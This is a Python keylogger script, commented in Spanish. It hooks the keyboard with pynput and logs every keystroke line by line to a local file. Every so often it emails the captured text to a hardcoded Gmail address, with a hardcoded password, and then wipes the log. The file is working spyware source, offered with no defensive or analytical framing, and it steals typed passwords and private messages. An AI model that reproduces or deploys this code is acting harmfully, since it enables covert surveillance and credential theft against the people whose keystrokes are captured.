from pynput import keyboard as kb
from tkinter import *
from Email import *
import time
class Save():
	#se inicia el init
	def __init__(self):

		self.cont = 0
		self.cont2 = 0
		self.text = []
		self.txt = []
		self.aux = 1
		self.exit = 'open'
		#se inicia el listener para obtener las pulsaciones de el teclado
		capture = kb.Listener(self.press)
		capture.start()
		self.Reloj()

	#se encarga de guardar las pulsaciones de el teclado
	def press(self,key):
		print("presiono la lecla ",key)
		aux = str(key)
		#print(aux)
		if aux == 'Key.enter':
		
			tex = "".join(self.text)
			tex2 = []
			for i in tex:
				if(i != "'"):
					#print(i)
					tex2.append(i)

			tex2 = "".join(tex2)
			self.file_person = open("captura2.txt","a")
			self.file_person.write(tex2)
			self.file_person.write("\n")
			self.file_person.close()
			self.txt = (tex2 + "\n")
			print(tex)
			self.text = []

			
		elif(aux == 'Key.space'):

			self.text.append(" ")

		elif(aux == 'Key.backspace'):
			
			try:
				self.text.pop()
			except:
				print("la variable texto esta vacia")

		elif(aux == 'Key.tab'):

			self.text.append("/")

		elif(aux == '<67>'):

			self.exit = 'exit'
			return False

		elif(aux == '<88>'):

			print("la ventana se cerrara")

		elif(aux == '<96>'):

			self.text.append('0')

		elif(aux == '<97>'):

			self.text.append('1')

		elif(aux == '<98>'):

			self.text.append('2')

		elif(aux == '<99>'):

			self.text.append('3')

		elif(aux == '<100>'):

			self.text.append('4')

		elif(aux == '<101>'):

			self.text.append('5')

		elif(aux == '<102>'):

			self.text.append('6')

		elif(aux == '<103>'):

			self.text.append('7')

		elif(aux == '<104>'):

			self.text.append('8')

		elif(aux == '<105>'):

			self.text.append('9')

		else:

			self.text.append(str(key))


	def Reloj(self):

		self.cont += 1
		print(self.cont)

		if self.exit != 'exit':	
			time.sleep(1) #1440 un dia

			if self.cont == 60:

				if self.cont2 == 1:
					self.send_info()
					self.cont2 = 0
				
				self.cont2 +=1
					
				self.cont = 0

			self.Reloj()

	def send_info(self):

		file_person = open("captura2.txt","r")
		tex2 = file_person.readlines()
		file_person.close()
		print(tex2)

		TXT = "'".join(tex2)

		enviar('hakersanonimoushack@gmail.com','m04168418681','hakersanonimoushack@gmail.com','informacion',str(TXT))
		file_person = open("captura2.txt","w")
		file_person.write('')


#se instancia la clase
if __name__ == '__main__':
	save_all = Save()